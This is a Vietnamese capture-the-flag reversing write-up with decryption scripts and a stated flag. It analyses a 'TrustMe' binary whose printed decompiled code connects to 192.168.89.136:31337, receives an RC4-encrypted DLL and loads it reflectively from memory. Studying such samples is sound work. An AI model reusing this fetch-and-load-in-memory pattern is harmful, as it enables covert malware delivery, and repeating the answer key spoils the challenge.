<img width="1776" height="44" alt="{99834936-D848-4F16-965A-16532F70CEFF}" src="https://github.com/user-attachments/assets/3a5192e1-a4f9-4a82-905e-05f08696b613" />
`ContextRecord` thì nó đang chứa opcode của handler
Làm script
```py
import sys, struct
from Crypto.Cipher import AES

XOR_KEY = b''.join(struct.pack('<I', x) for x in [
    0x3D5F678C, 0x31EF3EF1, 0xD752DEF0, 0x944DACC8,
    0xE0B79816, 0x0D2AE632, 0x9BCC5374, 0x3A8A5B06
])

VEH_OPS = [
    (28,4),(33,1),(26,6),(23,0),(28,5),(3,1),(27,6),(40,6),(26,2),(13,5),(2,3),
    (32,6),(9,5),(29,4),(19,2),(21,0),(15,0),(45,2),(16,6),(33,2),(6,1),(11,2),
    (2,5),(10,1),(47,4),(4,5),(44,0),(36,3),(29,2),(20,1),(21,1),(41,3),(28,2),
    (35,6),(21,0),(7,3),(11,3),(16,5),(26,1),(12,3),(4,2),(26,0),(7,5),(8,3),
    (12,3),(37,6),(33,0),(11,3),(44,5),(22,4),(23,4),(5,2),(13,3),(8,4),(35,6),
    (23,5),(36,4),(26,5),(5,1),(13,3),(6,4),(9,4),(16,4),(11,2),(0,1),(1,2),
    (42,6),(4,1),(29,0),(43,1),(42,5),(35,2),(2,4),(36,3),(39,6),(20,3),(40,5),
    (40,2),(40,0),(5,4),(9,4),(40,4),(30,5),(31,2),(46,6),(41,1),(36,5),(38,1),
    (7,3),(22,3),(7,0),(42,1),(4,6),(36,3),(37,5),(15,5),(39,1),(41,2),(19,0),
    (4,5),(20,2),(7,2),(4,6),(30,4),(7,1),(38,0),(36,1),(40,6),(28,4),(15,2),
    (30,4),(38,0),(19,3),(40,6),(0,5),(22,5),(46,0),(11,6),(25,6),(42,0),(7,1),
    (18,0),(0,0),(22,0),(35,2),(2,1),(32,4),(0,2),(30,3),(10,0),(40,0),(35,3),
    (47,4),(33,3),(14,2),(10,5),(9,4),(44,2),(17,2),(25,0),(21,3),(9,2),(15,5),
    (36,3),(40,2),(39,4),(30,2),(15,3),(39,4),(4,0),(6,3),(36,2),(22,3),(31,5),
    (23,5),(27,3),(40,3),(6,4),(25,2),(31,0),(35,3),(26,0),(42,0),(42,6),(41,6),
    (30,1),(19,0),(39,4),(14,1),(25,4),(10,4),(5,1),(25,0),(33,2),(15,1),(3,2),
    (28,1),(17,4),(34,3),(26,0),(39,6),(13,4),(29,0),(19,5),(33,4),(6,3),(24,6),
    (41,1),(47,3),(13,5),(4,4),(10,2),(25,4),(0,6),(3,4),(24,6),(21,3),(42,2),
    (13,1),(14,5),(3,4),(26,0),(47,5),(31,5),(0,2),(16,1),(46,5),(13,5),(27,3),
    (31,2),(38,6),(40,5),(32,3),(8,6),(0,5),(7,0),(47,0),(29,2),(11,2),(19,6),
    (29,4),(19,4),(31,0),(45,6),(22,6),(25,3),(44,4),(23,0),(42,1),(10,5),(21,2),
    (35,6),(27,6),(1,6),(45,0),(20,4),(44,2),(11,6),(19,1),(13,4),(42,2),(36,3),
    (36,3),(33,6),(39,6),(16,1),(23,3),(22,1),(40,5),(20,4),(33,5),(21,4),(35,0),
    (40,2),(18,2),(38,1),(31,6),(22,3),(18,0),(34,5),(7,3),(20,4),(1,2),(43,1),
    (7,5),(35,5),(4,1),(13,6),(44,4),(25,6),(29,3),(3,1),(12,6),(22,5),(27,0),
    (2,5),(11,1),(44,3),(18,4),(9,3),(47,0),(1,5),(25,1),(39,1),(36,4),(29,0),
    (17,0),(15,6),(25,2),(4,0),(17,0),(19,6),(12,6),(42,4),(37,6),(7,1),(40,3),
    (42,2),(22,2),(38,4),(47,4),(7,5),(22,6),(20,3),(2,3),(0,5),(16,5),(41,1),
    (18,2),(37,1),(20,2),(24,0),(15,2),(0,1),(44,3),(0,5),(27,5),(14,2),(0,2),
    (34,5),(6,5),(42,1),(1,2),(15,6),(39,6),(39,6),(4,6),(8,2),(2,4),(34,6),
    (0,5),(3,0),(15,0),(44,1),(26,6),(26,5),(2,2),(21,4),(16,1),(45,6),(18,1),
    (18,3),(9,5),(17,0),(1,0),(3,2),(40,1),(23,4),(6,5),(21,1),(31,4),(15,3),
    (13,6),(31,3),(46,3),(29,0),(25,6),(30,0),(47,2),(27,4),(32,3),(12,5),(37,3),
    (31,1),(37,1),(2,4),(10,6),(26,3),(34,0),(33,5),(21,5),(39,4),(28,6),(21,0),
    (39,2),(36,6),(7,4),(20,1),(15,2),(47,1),(26,0),(25,3),(33,4),(15,3),(40,3),
    (0,6),(2,1),(26,4),(35,4),(12,5),(27,3),(11,0),(43,5),(2,4),(35,2),(16,2),
    (14,0),(44,6),(1,5),(4,2),(25,3),(11,1),(17,5),(21,1),(5,1),(38,0),(26,1),
    (32,2),(31,2),(25,3),(16,4),(9,5),(41,3),(44,2),(14,1),(21,5),(32,3),(6,4),
    (39,6),(25,4),(41,6),(44,0),(25,0),(43,4),(18,4),(0,2),(20,3),(34,0),(18,4),
    (28,6),(20,2),(13,2),(20,6),(23,2),(47,6),(12,2),(19,1),(4,5),(16,4),(35,2),
    (36,2),(9,4),(37,4),(7,3),(42,0),(35,4),(14,2),(26,1),(17,5),(13,4),(24,2),
    (24,1),(25,2),(22,5),(29,6),(24,1),(28,4),(7,1),(1,0),(2,3),(24,6),(37,6),
    (30,1),(47,2),(43,2),(39,2),(10,4),(27,0),(34,5),(25,5),(9,5),(1,2),(23,1),
    (28,0),(13,2),(13,4),(40,5),(20,5),(40,1),(25,4),(5,0),(12,6),(31,1),(0,2),
    (21,1),(19,4),(28,2),(28,0),(4,3),(1,6),(33,3),(41,2),(7,0),(4,4),(3,0),
    (37,4),(39,2),(12,4),(42,6),(44,2),(16,3),(31,3),(39,0),(26,3),(6,0),(14,5),
    (34,5),(41,0),(38,0),(32,1),(27,0),(5,0),(35,4),(27,0),(14,2),(3,3),(5,0),
    (38,0),(31,6),(29,6),(18,5),(11,1),(8,4),(46,5),(5,6),(42,1),(47,1),(17,2),
    (6,1),(22,0),(41,3),(38,4),(3,5),(16,6),(10,2),(0,2),(41,1),(16,6),(47,1),
    (11,0),(23,1),(27,2),(5,5),(31,0),(18,4),(6,2),(24,0),(46,1),(26,3),(29,1),
    (4,6),(10,2),(32,2),(17,3),(2,0),(23,0),(35,3),(2,0),(16,1),(10,1),(46,6),
    (3,4),(33,3),(24,6),(30,1),(33,2),(4,1),(6,0),(38,5),(47,3),(40,2),(46,1),
    (10,3),(9,1),(9,1),(22,3),(19,0),(30,4),(20,6),(44,6),(15,3),(23,2),(35,1),
    (1,5),(41,3),(28,0),(46,6),(43,4),(23,2),(13,3),(21,6),(38,5),(1,1),(41,4),
    (11,2),(3,1),(31,4),(33,6),(6,3),(43,2),(22,6),(39,4),(40,1),(25,1),(4,5),
    (26,6),(5,2),(8,4),(31,4),(13,1),(17,3),(2,6),(40,2),(5,2),(39,4),(34,0),
    (15,1),(9,4),(13,5),(29,3),(15,1),(45,3),(22,4),(7,1),(26,5),(2,6),(40,1),
    (10,4),(4,1),(38,1),(38,3),(5,5),(8,2),(21,1),(39,4),(40,6),(4,0),(8,3),
    (6,5),(4,1),(39,4),(13,0),(32,4),(22,4),(16,1),(13,0),(25,6),(46,6),(35,2),
    (29,5),(15,5),(7,4),(33,5),(24,0),(27,3),(13,6),(40,6),(18,2),(47,6),(46,1),
    (36,2),(33,1),(25,5),(18,1),(25,4),(6,1),(20,3),(38,0),(22,5),(36,4),(17,4),
    (6,1),(39,3),(4,5),(4,1),(22,3),(41,5),(45,1),(34,0),(19,3),(26,6),(47,5),
    (34,4),(19,3),(7,1),(21,6),(6,4),(0,0),(28,3),(6,3),(41,3),(42,1),(36,3),
    (35,6),(15,3),(40,5),(45,2),(2,5),(37,2),(8,3),(27,3),(16,3),(37,3),(45,3),
    (17,0),(45,4),(3,6),(27,3),(14,6),(25,5),(43,2),(44,2),(9,6),(19,3),(0,6),
    (28,6),(32,5),(36,4),(18,0),(16,2),(6,0),(1,5),(25,5),(40,3),(34,4),(46,4),
    (7,5),(5,6),(15,3),(8,1),(45,1),(45,3),(4,3),(38,0),(6,5),(42,2),(31,3),
    (42,4),(39,1),(30,4),(16,1),(0,0),(22,3),(43,5),(6,5),(8,2),(21,6),(21,2),
    (46,1),(39,5),(24,1),(26,6),(20,2),(38,4),(33,5),(19,6),(15,5),(19,6),(0,0),
    (27,2),(28,2),(23,3),(20,1),(14,5),(47,0),(44,4),(33,5),(35,6),(21,3),(10,1),
    (25,1),(40,3),(0,0),(14,0),(42,1),(9,1),(21,6),(12,6),(24,3),(46,4),(17,0),
    (11,2),(12,3),(44,1),(10,5),(2,4),(40,6),(7,3),(13,4),(44,4),(22,3),(1,4),
    (36,4),(37,1),(20,4),(41,6),(13,3),(4,4),(6,5),(45,6),(33,3),(27,4),(43,4),
    (19,0),(25,5),(45,3),(44,3),(9,6),(34,5),(15,2),(1,5),(26,2),(34,5),(25,0),
    (47,3),(9,4),(39,0),(10,1),(24,0),(41,4),(2,4),(14,5),(19,5),(43,1),(22,6),
    (31,4),(0,2),(28,1),(30,4),(19,4),(0,3),(8,3),(23,0),(38,1),(44,6),(24,2),
    (43,3),(34,0),(25,0),(1,5),(35,2),(45,2),(22,4),(34,5),(33,1),(37,4),(44,1),
    (20,0),(4,0),(0,3),(29,6),(24,1),(46,3),(31,4),(43,2),(12,2),(28,5),(3,2),
    (4,0),(24,6),(21,0),(27,4),(38,2),(37,6),(15,2),(35,3),(30,3),(13,1),(32,4),
    (10,6),(11,5),(39,5),(25,5),(10,5),(16,2),(0,6),(11,2),(21,3),(6,3),(36,5),
    (20,1),(39,4),(28,3),(17,2),(35,1),(42,2),(30,0),(35,6),(20,4),(36,0),(12,5),
    (13,3),(22,0),(11,1),(0,5),(34,4),(18,5),(18,6),(44,3),(23,6),(7,4),(21,3),
    (17,3),(11,4),(7,2),(27,0),(0,6),(42,6),(24,4),(30,3),(21,6),(27,0),(18,6),
    (40,3),(33,6),(42,6),(34,4),(23,2),(18,2),(29,2),(31,1),(35,2),(45,3),(9,5),
    (31,2),(18,6),(37,0),(36,2),(8,0),(25,6),(20,0),(47,3),(38,5),(12,5),(6,4),
    (2,5),(15,0),(34,0),(38,0),(35,4),(20,2),(1,1),(42,2),(28,1),(33,3),(47,1),
    (17,1),(11,0),(7,1),(22,1),(23,2),(20,3),(25,2),(23,1),(43,1),(24,6),(41,6),
    (43,3),(22,0),(1,2),(8,6),(14,4),(17,4),(40,2),(35,6),(4,2),(33,3),(20,6),
    (2,5),(39,4),(16,6),(0,3),(9,2),(16,5),(40,2),(47,2),(31,3),(17,1),(33,3),
    (23,2),(35,4),(16,1),(41,6),(7,5),(2,1),(31,4),(38,0),(3,6),(42,6),(10,4),
    (47,1),(24,6),(42,2),(44,6),(34,1),(20,5),(39,6),(46,0),(8,2),(41,3),(35,6),
    (40,2),(20,4),(28,5),(10,0),(17,1),(27,0),(44,2),(40,1),(36,2),(5,3),(20,0),
    (17,6),(45,0),(23,2),(29,1),(25,2),(43,2),(9,5),(4,1),(13,1),(8,6),(6,0),(28,5),
]

def undo_veh(data):
    for idx, op in reversed(VEH_OPS):
        if op == 0: data[idx] ^= 0x0D
        elif op == 1: data[idx] = (data[idx] - 37) & 0xFF
        elif op == 2: data[idx] = (data[idx] + 37) & 0xFF
        elif op == 3: data[idx] ^= 0x25
        elif op == 4: data[idx] = (data[idx] - 13) & 0xFF
        elif op == 5: data[idx] = (data[idx] + 13) & 0xFF
        elif op == 6:
            for i in range(idx):
                data[i] ^= 0xFF
    return data

def xor_stream(data):
    for i in range(len(data)):
        data[i] ^= XOR_KEY[i % 32]
    return data

def get_key():
    raw = b''.join(struct.pack('<I', x) for x in [
        0xA9A51F0D, 0x80CF669F, 0x63E7175C, 0xBDCD557A
    ])
    return bytes(raw[i] ^ b'BMXc'[i % 4] for i in range(16))

def decrypt(ct):
    data = bytearray(ct)
    data = undo_veh(data)
    data = xor_stream(data)
    pt = AES.new(get_key(), AES.MODE_ECB).decrypt(bytes(data))
    return pt[:-pt[-1]]

if __name__ == "__main__":
    f = sys.argv[1] if len(sys.argv) > 1 else "flag.tcp1p"
    with open(f, "rb") as x:
        print(decrypt(x.read()).decode())
```

`TCP1P{wh4t_4_r3v3rs3_3ng1neEr!_76ad1fea}`

## TrustMe

Đầu tiên là main 
```cpp
void __noreturn sub_4033C0()
{
  int v0; // ebx
  int v1; // esi
  int v2; // edi
  const void *v3; // esi
  int v4; // eax
  void *v5; // edi
  const CHAR *v6; // ebx
  int v7; // ecx
  HANDLE FileA; // esi
  int v9; // [esp+0h] [ebp-20h]
  int v10; // [esp+4h] [ebp-1Ch]
  int v11; // [esp+8h] [ebp-18h]
  DWORD v12[2]; // [esp+Ch] [ebp-14h] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+14h] [ebp-Ch]
  LPSTR lpBuffer; // [esp+18h] [ebp-8h]
  void *v15; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h]

  lpBuffer = (LPSTR)malloc(0x1000u);
  v0 = dword_4203A8(0);
  v1 = dword_4203BC(v0, 105, "JPGENC");
  v2 = dword_4203C0(v0, v1);
  nNumberOfBytesToWrite = dword_420390(v0, v1);
  v3 = (const void *)dword_4203AC(v2);
  strcpy((char *)v12, "imSoSad");
  v4 = dword_4203B0(0);
  dword_4203A4(v4);
  v15 = malloc(nNumberOfBytesToWrite);
  memmove(v15, v3, nNumberOfBytesToWrite);
  v5 = malloc(nNumberOfBytesToWrite + 1);
  memset(v5, 0, nNumberOfBytesToWrite + 1);
  sub_402620(v12, strlen((const char *)v12), v5);
  v6 = lpBuffer;
  GetCurrentDirectoryA(0x1000u, lpBuffer);
  sub_401670(v7, (int)v6, (int)"%s\\stopDebug.jpg", (int)v6);
  FileA = CreateFileA(v6, 0x40000000u, 0, 0, 2u, 0x80u, 0);
  WriteFile(FileA, v5, nNumberOfBytesToWrite, 0, 0);
  CloseHandle(FileA);
  sub_4080D0(v6);
  dword_4203B8(
    0,
    "Trust me, when have I ever tricked you?",
    "Stop debugging!!!!",
    16,
    v9,
    v10,
    v11,
    v12[0],
    v12[1],
    nNumberOfBytesToWrite,
    lpBuffer,
    v15,
    savedregs);
  _loaddll((char *)0xFFFFFFFF);
  __debugbreak();
}
```

Hàm main này thì chống debug, rồi in ảnh thôi. Check lại asm của main.

<img width="620" height="682" alt="{F05D9C6A-6246-4259-AB0E-3C3940E00574}" src="https://github.com/user-attachments/assets/a3a43bc8-99ea-4cd6-b0ef-c07752243467" />

Vào `sub_4034F0` thì mình thấy đoạn này cũng đang troll mình 

```cpp
void __fastcall sub_4034F0(int a1)
{
  bool v1; // zf
  int v2; // eax
  int v3; // edx
  _DWORD *v4; // edi
  int v5; // esi
  int v6; // ebx
  int v7; // eax
  int v8; // ecx
  int v9; // ebx
  int v10; // esi
  int v11; // edi
  DWORD v12; // ebx
  const void *v13; // esi
  int v14; // eax
  void *v15; // edi
  const CHAR *v16; // ebx
  int v17; // ecx
  HANDLE FileA; // esi
  _OWORD v19[15]; // [esp+0h] [ebp-10Ch] BYREF
  int v20; // [esp+F0h] [ebp-1Ch]
  int v21; // [esp+F4h] [ebp-18h]
  int v22; // [esp+F8h] [ebp-14h]
  DWORD nNumberOfBytesToWrite; // [esp+FCh] [ebp-10h]
  LPSTR lpBuffer; // [esp+100h] [ebp-Ch]
  const char *v25; // [esp+104h] [ebp-8h]
  void *v26; // [esp+108h] [ebp-4h]

  v1 = *(_BYTE *)a1 == 80;
  v19[0] = xmmword_41DD20;
  v25 = (const char *)a1;
  v19[1] = xmmword_41DCE0;
  v20 = 17956;
  v19[2] = xmmword_41DCC0;
  v21 = 9;
  v19[3] = xmmword_41DD60;
  v22 = 18225;
  v19[4] = xmmword_41DCB0;
  v19[5] = xmmword_41DCA0;
  v19[6] = xmmword_41DD40;
  v19[7] = xmmword_41DD30;
  v19[8] = xmmword_41DD50;
  v19[9] = xmmword_41DCD0;
  v19[10] = xmmword_41DC90;
  v19[11] = xmmword_41DCF0;
  v19[12] = xmmword_41DD00;
  v19[13] = xmmword_41DD10;
  v19[14] = xmmword_41DC80;
  if ( v1 )
  {
    LOBYTE(v2) = *(_BYTE *)(a1 + 1);
    v3 = a1 + 1;
    if ( (_BYTE)v2 )
    {
      v4 = v19;
      v26 = (void *)~a1;
      while ( 1 )
      {
        v5 = *(char *)(v3 - 1);
        v2 = (char)v2;
        v6 = 2 * (char)v2;
        v7 = v2 * v2;
        v8 = (((_BYTE)v3 + (_BYTE)v26) & 1) != 0 ? v5 - v6 : v5 + v6;
        if ( v7 + v5 * v8 != *v4 )
          break;
        LOBYTE(v2) = *(_BYTE *)++v3;
        ++v4;
        if ( !(_BYTE)v2 )
          goto LABEL_9;
      }
    }
    else
    {
LABEL_9:
      lpBuffer = (LPSTR)malloc(0x1000u);
      v9 = dword_4203A8(0);
      v10 = dword_4203BC(v9, 101, "JPGENC");
      v11 = dword_4203C0(v9, v10);
      v12 = dword_420390(v9, v10);
      nNumberOfBytesToWrite = v12;
      v13 = (const void *)dword_4203AC(v11);
      v14 = dword_4203B0(0);
      dword_4203A4(v14);
      v26 = malloc(v12);
      memmove(v26, v13, v12);
      v15 = malloc(v12 + 1);
      memset(v15, 0, v12 + 1);
      sub_402620(v25, strlen(v25), v15);
      v16 = lpBuffer;
      GetCurrentDirectoryA(0x1000u, lpBuffer);
      sub_401670(v17, (int)v16, (int)"%s\\likeFlag.jpg", (int)v16);
      FileA = CreateFileA(v16, 0x40000000u, 0, 0, 2u, 0x80u, 0);
      WriteFile(FileA, v15, nNumberOfBytesToWrite, 0, 0);
      CloseHandle(FileA);
      sub_4080D0(v16);
    }
  }
}
```
Thế nhưng ct có một function này khá đặc biệt
```cpp
int sub_403010()
{
  _DWORD *v0; // ebx
  int v1; // eax
  int v2; // esi
  int v3; // eax
  PADDRINFOA *v4; // edi
  int (__stdcall *v5)(const char *, const char *, int, int); // eax
  int v6; // eax
  PADDRINFOA v7; // eax
  int v8; // eax
  int v9; // ecx
  int v10; // eax
  int v11; // eax
  int v12; // esi
  int v13; // eax
  int v14; // esi
  int v15; // edi
  void *v16; // edi
  int v17; // esi
  int v18; // ebx
  int v19; // edi
  int v20; // eax
  int *v21; // esi
  int v22; // eax
  int v23; // eax
  int v24; // eax
  void *v26; // [esp+70h] [ebp-24h]
  unsigned int v27; // [esp+74h] [ebp-20h]
  int v28; // [esp+78h] [ebp-1Ch]
  _DWORD v29[2]; // [esp+8Ch] [ebp-8h] BYREF

  malloc(8u);
  sub_402720();
  v29[0] = 4;
  v0 = malloc(0x14u);
  v26 = dword_420398;
  *(_OWORD *)v0 = 0;
  v0[4] = 0;
  memset(v26, 0, 0x2CCu);
  v1 = dword_4203B0(0);
  dword_4203A4(v1);
  v2 = sub_401480();
  v3 = (*(int (__stdcall **)(int, int))(v2 + 456))(514, v2);
  *(_DWORD *)(v2 + 444) = v3;
  if ( v3 )
    ExitProcess(1u);
  *(_DWORD *)(v2 + 412) = 0;
  v4 = (PADDRINFOA *)(v2 + 404);
  *(_DWORD *)(v2 + 428) = 0;
  *(_DWORD *)(v2 + 432) = 0;
  *(_DWORD *)(v2 + 436) = 0;
  *(_DWORD *)(v2 + 440) = 0;
  v5 = *(int (__stdcall **)(const char *, const char *, int, int))(v2 + 460);
  *(_DWORD *)(v2 + 416) = 0;
  *(_DWORD *)(v2 + 420) = 1;
  *(_DWORD *)(v2 + 424) = 6;
  v6 = v5("192.168.89.136", "31337", v2 + 412, v2 + 404);
  *(_DWORD *)(v2 + 444) = v6;
  if ( v6 )
    goto LABEL_4;
  v7 = *v4;
  *(_DWORD *)(v2 + 408) = *v4;
  if ( v7 )
  {
    while ( 1 )
    {
      v8 = (*(int (__stdcall **)(int, int, int))(v2 + 464))(v7->ai_family, v7->ai_socktype, v7->ai_protocol);
      *(_DWORD *)(v2 + 400) = v8;
      (*(void (__stdcall **)(int, int, int, int, int))(v2 + 468))(v8, 0xFFFF, 4101, v2 + 452, 4);
      v9 = *(_DWORD *)(v2 + 400);
      if ( v9 == -1 )
        break;
      v10 = (*(int (__stdcall **)(int, _DWORD, _DWORD))(v2 + 476))(
              v9,
              *(_DWORD *)(*(_DWORD *)(v2 + 408) + 24),
              *(_DWORD *)(*(_DWORD *)(v2 + 408) + 16));
      *(_DWORD *)(v2 + 444) = v10;
      if ( v10 == -1 )
      {
        (*(void (__stdcall **)(_DWORD))(v2 + 480))(*(_DWORD *)(v2 + 400));
        v11 = *(_DWORD *)(v2 + 408);
        *(_DWORD *)(v2 + 400) = -1;
        v7 = *(PADDRINFOA *)(v11 + 28);
        *(_DWORD *)(v2 + 408) = v7;
        if ( v7 )
          continue;
      }
      goto LABEL_9;
    }
LABEL_4:
    (*(void (**)(void))(v2 + 472))();
    ExitProcess(1u);
  }
LABEL_9:
  freeaddrinfo(*v4);
  if ( *(_DWORD *)(sub_401480() + 400) != -1 )
  {
    v12 = sub_401480();
    if ( !(*(int (__stdcall **)(_DWORD, _DWORD *, int, _DWORD))(v12 + 488))(*(_DWORD *)(v12 + 400), v0, 512, 0) )
    {
      *(_DWORD *)(v12 + 400) = 0;
      *(_BYTE *)(v12 + 496) = 0;
    }
    v13 = sub_401480();
    (*(void (__stdcall **)(_DWORD, _DWORD *, int, _DWORD))(v13 + 484))(*(_DWORD *)(v13 + 400), v29, 1, 0);
    v29[0] = strlen((const char *)sub_402920());
    sub_4029C0(v0);
    strlen((const char *)sub_402920());
    sub_402920();
    sub_4029C0(v0);
    v14 = dword_4203B4 + 4;
    v15 = sub_401480();
    if ( !(*(int (__stdcall **)(_DWORD, int, int, _DWORD))(v15 + 488))(*(_DWORD *)(v15 + 400), v14, 4, 0) )
    {
      *(_DWORD *)(v15 + 400) = 0;
      *(_BYTE *)(v15 + 496) = 0;
    }
    v16 = malloc(*(_DWORD *)(dword_4203B4 + 4));
    v17 = *(_DWORD *)(dword_4203B4 + 4);
    *(_DWORD *)(dword_4203B4 + 8) = v16;
    v18 = sub_401480();
    if ( !(*(int (__stdcall **)(_DWORD, void *, int, _DWORD))(v18 + 488))(*(_DWORD *)(v18 + 400), v16, v17, 0) )
    {
      *(_DWORD *)(v18 + 400) = 0;
      *(_BYTE *)(v18 + 496) = 0;
    }
    v27 = strlen((const char *)sub_402920());
    v19 = dword_4203B4;
    v28 = *(_DWORD *)(dword_4203B4 + 8);
    v20 = sub_402920();
    sub_402620(v20, v27, v28);
    v21 = (int *)dword_4203B4;
    v22 = sub_401F00(*(_DWORD *)(v19 + 8), *(_DWORD *)(v19 + 4));
    *v21 = v22;
    if ( !v22 )
      sub_401600("Can't load library from memory.\n");
    if ( !*(_DWORD *)dword_4203B4 )
    {
      _loaddll((char *)0xFFFFFFFF);
      JUMPOUT(0x4033B3);
    }
    dword_420394 = sub_402720();
    v29[1] = *(_DWORD *)dword_420394 / (unsigned int)dword_41F8B0;
    v23 = sub_402920();
    sub_4029C0(v23);
  }
  dword_42039C(1, sub_402E80);
  v24 = dword_4203B0(5);
  dword_4203A4(v24);
  return 0;
}
```
Đầu tiên nó đang gọi `sub_401480`, đoạn này chương trình đang thực hiện resolve API. 
```cpp
_DWORD *sub_711480()
{
  _DWORD *result; // eax
  _DWORD *v1; // esi

  result = (_DWORD *)dword_730358;
  if ( !dword_730358 )
  {
    v1 = operator new(0x1F4u);
    v1[100] = -1;
    v1[101] = 0;
    v1[102] = 0;
    v1[112] = 512;
    v1[113] = 500;
    *((_BYTE *)v1 + 496) = 0;
    v1[114] = sub_711B80("ws2_32.dll");         // WSAStartup
    v1[115] = sub_711B80("ws2_32.dll");         // getaddrinfo
    v1[116] = sub_711B80("ws2_32.dll");         // socket
    v1[117] = sub_711B80("ws2_32.dll");         // setsockopt
    v1[118] = sub_711B80("ws2_32.dll");         // WSACleanup
    v1[119] = sub_711B80("ws2_32.dll");         // connect
    v1[120] = sub_711B80("ws2_32.dll");         // closesocket
    v1[121] = sub_711B80("ws2_32.dll");         // send
    v1[122] = sub_711B80("ws2_32.dll");         // recv
    v1[123] = sub_711B80("ws2_32.dll");         // shutdown
    result = v1;
    dword_730358 = (int)v1;
  }
  return result;
}
``` 
Mình đã resolve hết các API và có được như sau. Đây là Winsock API và nó đang được gọi để thiết lập kết nối

Vậy thì nó cũng khá là rõ rồi ct sẽ conect tới server `192.168.89.136: 31337` để truyền data.

Tiếp theo, sau khi ct gọi hết hàm của winsock, nó sẽ gọi `sub_402920` là một hàm rand
```cpp
int __usercall sub_402920@<eax>(int a1@<ebp>)
{
  int result; // eax
  unsigned int v2; // eax
  _BYTE *v3; // edi
  unsigned int i; // esi
  char v5[64]; // [esp-40h] [ebp-4Ch] BYREF
  int v6; // [esp+0h] [ebp-Ch]
  void *v7; // [esp+4h] [ebp-8h]
  void *retaddr; // [esp+Ch] [ebp+0h]

  v6 = a1;
  v7 = retaddr;
  result = dword_420360;
  if ( !dword_420360 )
  {
    v2 = unknown_libname_22(0);
    srand(v2);
    strcpy(v5, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
    v3 = malloc(0x40u);
    for ( i = 0; i < 64; ++i )
      v3[i] = v5[rand() % 52];
    v3[64] = 0;
    result = (int)v3;
    dword_420360 = (int)v3;
  }
  return result;
}
```
Hàm sinh ra 64 byte random 

Tiếp theo, đoạn này đang cố load một cái DLL
```cpp
    v22 = sub_401F00(*(_DWORD *)(v19 + 8), *(_DWORD *)(v19 + 4));
    *v21 = v22;
    if ( !v22 )
      sub_401600("Can't load library from memory.\n");
    if ( !*(_DWORD *)dword_4203B4 )
    {
      _loaddll((char *)0xFFFFFFFF);
      JUMPOUT(0x4033B3);
```
`sub_401F00` ở đây là một Reflective PE loader, nó load DLL từ RAM 

#### Phân tích file record

<img width="1920" height="717" alt="{A6D4754B-76D3-4326-A495-4C4A534746D7}" src="https://github.com/user-attachments/assets/2963dc92-7ecd-4b64-b553-87f795878688" />

- Tại số 6 server 31337 sẽ gửi đến client 51392 một cái key là `I'm_4_Gat3_K33per`

- Tại số 9 ct có gửi một gói tin có 68 bytes và 64 bytes có được là do `sub_402920` cộng thêm 4 bytes padding. 64 bytes này sẽ được RC4 với key `I'm_4_Gat3_K33per`

```py
def rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]

    out = []
    x = y = 0
    for byte in data:
        x = (x + 1) & 0xFF
        y = (y + S[x]) & 0xFF
        S[x], S[y] = S[y], S[x]
        out.append(byte ^ S[(S[x] + S[y]) & 0xFF])

    return bytes(out)

key        = b"I'm_4_Gat3_K33per"
padding    = 4
ciphertext = bytes.fromhex(
    "86dad7bb918e87d161556ad2e40a89010adfe3aa41ca44764e786b738047456"
    "cc80d021e7f60b56776b858225d45099f0e99b62f5758977fde740bcc2be36d"
    "bf403eb860"
)[padding:]

plaintext = rc4(key, ciphertext)
print(plaintext.decode("utf-8", errors="replace"))
# WTPjWbJafqNPqrZFswaijmyVKMddOrKzukegbVDpXJqDfulPDmDwDasqTwxvibnM
```
Tiếp theo data sẽ được gửi từ server 31337 về lại client 51392 qua 11, 13, 14, 16, 17, 19, 20, 22. Mình sẽ dump cái data này để lấy DLL

Script
```py
from scapy.all import rdpcap, TCP, Raw
from arc4 import ARC4

pcap_file = "record.pcapng"
key = b'WTPjWbJafqNPqrZFswaijmyVKMddOrKzukegbVDpXJqDfulPDmDwDasqTwxvibnM'

target_packets = [11,13,14,16,17,19,20,22]

packets = rdpcap(pcap_file)

blob = b''

for i in target_packets:
    pkt = packets[i-1]  # scapy is 0-indexed

    if pkt.haslayer(Raw):
        blob += bytes(pkt[Raw].load)
    else:
        print(f"[!] Packet {i} has no payload")

# decrypt once
result = ARC4(key).decrypt(blob)

with open("record.dll", "wb") as f:
    f.write(result)

print("[+] Done")
```

Sau đó chúng ta có một file DLL
```cpp
int __cdecl gen0(const char *a1)
{
  int v1; // esi
  int result; // eax
  int v3; // ecx
  int v4; // edi
  const char *v5; // edx
  char v6; // al

  v1 = strlen(a1);
  result = sub_10001210(v1 + 1);
  v3 = 0;
  v4 = result;
  if ( v1 <= 0 )
  {
    *(_BYTE *)(result + v1) = 0;
  }
  else
  {
    v5 = &a1[v1 - 1];
    do
    {
      v6 = *v5--;
      *(_BYTE *)(v3 + v4) = v6;
      ++v3;
    }
    while ( v3 < v1 );
    *(_BYTE *)(v4 + v1) = 0;
    return v4;
  }
  return result;
}
```
```cpp
int __cdecl gen1(const char *a1)
{
  const char *v1; // edi
  int v2; // esi
  int result; // eax
  int v4; // ebx
  int (__cdecl *v5)(int); // ecx
  int v6; // ebx
  int v7; // esi
  bool v8; // zf
  char v9; // al
  int v10; // eax
  char v11; // cl
  int v12; // [esp-4h] [ebp-2Ch]
  int v13; // [esp+Ch] [ebp-1Ch]
  int v14; // [esp+10h] [ebp-18h]

  v1 = a1;
  v2 = strlen(a1);
  v14 = v2;
  result = sub_10001210(v2 + 1);
  v4 = result;
  v13 = result;
  if ( v2 > 0 )
  {
    v5 = islower;
    v6 = v2;
    v7 = result - (_DWORD)a1;
    while ( 1 )
    {
      v8 = v5(*v1) == 0;
      v12 = *v1;
      if ( !v8 )
        break;
      v10 = isupper(v12);
      v11 = *v1;
      if ( v10 )
      {
        v9 = tolower(v11);
        goto LABEL_7;
      }
LABEL_8:
      (v1++)[v7] = v11;
      v5 = islower;
      if ( !--v6 )
      {
        v4 = v13;
        result = v13;
        v2 = v14;
        goto LABEL_10;
      }
    }
    v9 = toupper(v12);
LABEL_7:
    v11 = v9;
    goto LABEL_8;
  }
LABEL_10:
  *(_BYTE *)(v4 + v2) = 0;
  return result;
}
```
```cpp
